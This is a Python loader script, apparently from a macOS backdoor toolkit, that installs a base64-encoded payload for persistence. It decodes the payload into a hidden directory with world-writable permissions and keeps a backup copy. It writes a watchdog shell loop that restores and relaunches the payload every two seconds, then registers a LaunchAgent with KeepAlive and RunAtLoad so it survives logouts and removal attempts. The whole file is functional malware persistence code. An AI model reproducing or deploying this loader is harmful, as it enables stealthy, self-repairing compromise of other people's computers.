# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import base64
import logging
import os
import subprocess
import sys
from textwrap import dedent

# ============================================================
# These variables will be patched when this loader is created.
LOADER_OPTIONS = {}
PAYLOAD_BASE64 = ""
# ============================================================

PROGRAM_DIRECTORY = os.path.expanduser(LOADER_OPTIONS.get("program_directory", ""))
LAUNCH_AGENT_NAME = LOADER_OPTIONS.get("launch_agent_name", "")
SCRIPT_FILENAME = LOADER_OPTIONS.get("script_filename", "agent.sh")
WATCHDOG_FILENAME = "watchdog.sh"
STOP_FILENAME = ".stop"
BACKUP_FILENAME = SCRIPT_FILENAME + ".bak"
LOG_FILENAME = "agent.log"

logging.basicConfig(format="[%(levelname)s] %(funcName)s:%(lineno)s - %(message)s", level=logging.DEBUG)
log = logging.getLogger("run_script")


def run_command(command):
    """Runs a system command and returns (return_code, output)."""
    try:
        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True
        )
        output = process.communicate()[0]
        if isinstance(output, bytes):
            output = output.decode("utf-8", errors="replace")
        return process.returncode, (output or "")
    except Exception as ex:
        return -1, str(ex)


def get_script_file():
    return os.path.join(PROGRAM_DIRECTORY, SCRIPT_FILENAME)


def get_watchdog_file():
    return os.path.join(PROGRAM_DIRECTORY, WATCHDOG_FILENAME)


def get_backup_file():
    return os.path.join(PROGRAM_DIRECTORY, BACKUP_FILENAME)


def get_stop_file():
    return os.path.join(PROGRAM_DIRECTORY, STOP_FILENAME)


def get_log_file():
    return os.path.join(PROGRAM_DIRECTORY, LOG_FILENAME)


def get_launch_agent_file():
    return os.path.join(os.path.expanduser("~/Library/LaunchAgents"), LAUNCH_AGENT_NAME + ".plist")


# --- Unload an already-running instance before (re)installing. ---
run_command("launchctl remove " + LAUNCH_AGENT_NAME)

run_command("mkdir -p " + PROGRAM_DIRECTORY)
run_command("mkdir -p " + os.path.expanduser("~/Library/LaunchAgents"))

if not os.path.isdir(PROGRAM_DIRECTORY):
    print("Failed to create program directory: " + PROGRAM_DIRECTORY)
    sys.exit(1)

# Write the script and a self-repair backup.
script = base64.b64decode(PAYLOAD_BASE64)
script_file = get_script_file()
with open(script_file, "wb") as output_file:
    output_file.write(script)
os.chmod(script_file, 0o777)

with open(get_backup_file(), "wb") as output_file:
    output_file.write(script)

# Watchdog: selects the interpreter by extension, keeps the script alive and
# captures stderr/stdout to a log file for later inspection. Self-repairs the
# script from the backup if it is removed. Respects the .stop flag for uninstall.
interpreter = {
    ".sh": "/bin/sh",
    ".rb": "ruby",
    ".ps1": "pwsh",
    ".bat": "cmd"
}.get(os.path.splitext(SCRIPT_FILENAME)[1].lower(), "/bin/sh")

watchdog = dedent("""\
    #!/bin/sh
    PROGRAM_DIR="%s"
    SCRIPT="%s"
    BACKUP="%s"
    STOP="%s"
    LOG="%s"
    INTERPRETER="%s"

    # Error capture: remember the last interpreter failure.
    last_error=""

    while true; do
        if [ -f "$STOP" ]; then
            exit 0
        fi

        if [ ! -f "$SCRIPT" ] && [ -f "$BACKUP" ]; then
            cp "$BACKUP" "$SCRIPT" 2>/dev/null
            chmod 777 "$SCRIPT" 2>/dev/null
        fi

        if [ -f "$SCRIPT" ]; then
            err=""
            if [ "$INTERPRETER" = "/bin/sh" ]; then
                /bin/sh "$SCRIPT" >> "$LOG" 2>&1; err="$?"
            elif command -v "$INTERPRETER" >/dev/null 2>&1; then
                "$INTERPRETER" "$SCRIPT" >> "$LOG" 2>&1; err="$?"
            else
                err="interpreter-not-found"
            fi
            # Capture any freshly produced error output.
            if [ -z "$err" ] || [ "$err" = "0" ]; then
                true
            else
                echo "[watchdog] exit=$err $(date)" >> "$LOG"
            fi
        fi
        sleep 2
    done
    """) % (PROGRAM_DIRECTORY, script_file, get_backup_file(), get_stop_file(), get_log_file(), interpreter)

with open(get_watchdog_file(), "w") as output_file:
    output_file.write(watchdog)
os.chmod(get_watchdog_file(), 0o777)

# Launch agent points at the watchdog; KeepAlive + RunAtLoad preserved.
launch_agent_create = dedent("""\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>KeepAlive</key>
    <true/>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
""") % (LAUNCH_AGENT_NAME, get_watchdog_file())

launch_agent_file = get_launch_agent_file()
with open(launch_agent_file, "w") as output_file:
    output_file.write(launch_agent_create)

plutil_rc, plutil_out = run_command("plutil -lint " + launch_agent_file)
if plutil_rc != 0:
    print("Generated launch agent is invalid, aborting.")
    sys.exit(1)

rc, out = run_command("launchctl load -w " + launch_agent_file)
if "already loaded" in out.lower():
    print("run_script launch agent already loaded; rearmed watchdog.")
elif rc != 0:
    print("Failed to load launch agent: " + out.strip())
    sys.exit(1)
else:
    print("run_script launch agent loaded.")

print("run_script installed: script=%s interpreter=%s" % (script_file, interpreter))
